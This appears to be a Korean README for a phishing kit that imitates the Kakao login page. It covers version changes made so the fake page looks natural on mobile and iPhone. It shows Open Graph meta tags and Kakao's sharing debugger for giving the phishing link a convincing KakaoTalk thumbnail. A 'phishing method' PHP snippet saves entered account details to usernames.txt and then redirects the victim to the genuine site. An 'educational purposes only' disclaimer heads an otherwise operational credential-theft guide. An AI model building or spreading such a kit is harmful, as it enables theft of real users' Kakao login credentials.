# 카카오 로그인 페이지

## ⚖️ 법적 면책 조항:
**교육 목적으로만 사용** <br />
사전 상호 동의 없이 대상을 공격하기 위해 사용하는 것은 불법입니다. 적용 가능한 모든 지역, 주 및 연방법을 준수하는 것은 최종 사용자의 책임입니다. 개발자는 이 프로그램으로 인한 오용이나 손상에 대해 책임을 지지 않으며 책임지지 않습니다. 책임감 있게 사용하세요!

## 버전 변천사


<img src="이미지 026.jpg" style="width: 70%;">

```
V1.0
어색한 로그와 모바일 버전에 많은 불편이 확인 되었습니다.
```
<img src="이미지 027.jpg" style="width: 70%;">

```
V2.0
공식 페이지의 로고를 따와 사진용으로 대체하여 더욱 자연스러운 로고를 나타냅니다.
일부 배경 화면 advertisement.png은 제거 하였습니다.
모바일 최적화 하기 위해 일부 폰트 사이즈를 조절 하였으며, tail 옵션 일부를 제거 하였습니다.
아이폰 기종에 색 반전 현상이 발생되어 input type 에서 button type 으로 교체하여 해결 하였습니다.
```
<img src="이미지 001.jpg" style="width: 70%;">

## 페이크 썸네일
<img src="이미지 003.png" style="width: 30%;">

```
<head>
    <meta property="og:url" content="[[카카오 썸네일 노출 링크]]">
    <meta property="og:title" content="제목">
    <meta property="og:type" content="website">
    <meta property="og:image" content="[[카카오 썸네일 노출 링크]]">
    <meta property="og:description" content="본문 내용.">
    <title>카카오톡 URL링크</title>
</head>
```
```
# 빠른 썸네일 반영
https://developers.kakao.com/tool/debugger/sharing
```
## 피싱 방법

```
# Post.PHP
$handle=fopen("usernames.txt","a"); 입력된 계정 정보를 usernames.txt에 저장 
header("location:[[로그인 버튼 누를시 이동되는 원본 사이트 주소]]");
```
